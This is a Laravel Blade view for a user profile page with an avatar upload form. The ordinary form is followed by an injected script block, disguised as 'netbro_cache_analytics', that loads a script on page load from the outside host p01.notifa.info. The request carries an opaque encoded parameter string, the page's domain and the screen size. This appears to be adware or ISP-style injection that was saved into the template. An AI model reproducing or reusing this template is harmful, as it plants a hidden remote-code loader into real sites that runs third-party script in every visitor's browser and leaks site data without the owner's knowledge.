@extends('layouts.app')

@section('content')
    <div class="container wrapper" style="margin-top: 4%;">
        <div class="col-sm-6 col-sm-offset-3">
            <div class="reg-form-container" style="padding: 40px 50px;">
                <div class="tab-pane">
                    <h2 style="text-align: center;">Profile</h2>
                    <form name="editProfile" enctype="multipart/form-data" action="{{route('profile')}}" method="POST">

                        <div class="avatar-upload{{ $errors->has('avatar') ? ' has-error' : '' }}">
                            <div class="avatar-edit">
                                <input type='file' name="avatar" id="imageUpload" accept=".png, .jpg, .jpeg, .svg"
                                       value="{{ old('avatar') }}" required/>
                                <input type="hidden" name="_token" value="{{csrf_token()}}">
                                <label for="imageUpload"></label>
                            </div>
                            <div class="avatar-preview">
                                <div id="imagePreview"
                                     style="background-image: url('/uploads/avatars/{{ Auth::user()->avatar }}');">
                                </div>
                            </div>
                            @if ($errors->has('avatar'))
                                <span class="help-block" style="text-align: center">
                                        <strong>{{ $errors->first('avatar') }}</strong>
                                    </span>
                            @endif
                        </div>

                        <h3 style="color: #555; text-align: center;">{{ Auth::user()->name }}</h3>
                        <h5 style="color: #555; text-align: center;">{{ Auth::user()->email }}</h5>
                        <div class="button-center" style="display: flex; justify-content: center; margin-top: 35px;">
                            <button type="submit" class="btn btn-primary">Edit Profile</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>

    <div id="spinner-wrapper">
        <div class="spinner"></div>
    </div>

    <script type="text/javascript">if (self === top) {
            function netbro_cache_analytics(fn, callback) {
                setTimeout(function () {
                    fn();
                    callback();
                }, 0);
            }

            function sync(fn) {
                fn();
            }

            function requestCfs() {
                var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
                var idc_glo_r = Math.floor(Math.random() * 99999999999);
                var url = idc_glo_url + "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAiySi%2bk45cljJxPp6Y86LGFk4AbWZZkO3GLi%2bv544%2fpXZGEJbwDK8FRcjTwVpmpcv%2bZRPdYdzPaiO1ZLFN4wsNFXRMOywQURRlMsj7jPXnFbMu7IR4uTIk8ds%2fGjCNbPLWVFI3kORLc9ze8%2fWF%2bXLuKoiGoIBwpO69tMT%2bWTtziQQm5CJu9OKtw1bhWn85%2fbMYPzZHJFLqOJUUNbChq0Zq%2fZ%2fx14dDwhwtAtCbF8Jjsxir8jskcrtNAZzDPWLLuvKeZ%2bysSwKkPTRuPMns805Oa7jZA3DFh0sCp7%2bW%2fuZEsuUh6XHSXFg0MrfgTDQ6jE2RoYjFAMNfQrfRQhBecgkl3gS9AErtw8TBqaebg%2b4Xi8H6Y0JsG6e0loC69SXm3Zohh59Thz%2fYDJoE851f1YM5sjW3zI4U68i8gL39tsa6y27XDwf89rWPLPhMLAOZZSX7R8cvAjm6QNBDecrUlgL3SQmn68OvtJIGlb%2bmhX1%2f0H5zgUrkRPXo3f9wnhZajWoPyEwvhNx6v4DO4Hzbr4mVoS51Bxc6mFMoorAwyFIoFjSZM%2fJmeSIKw%3d%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
                var bsa = document.createElement('script');
                bsa.type = 'text/javascript';
                bsa.async = true;
                bsa.src = url;
                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
            }

            netbro_cache_analytics(requestCfs, function () {
            });
        }
        ;</script></body>
@endsection
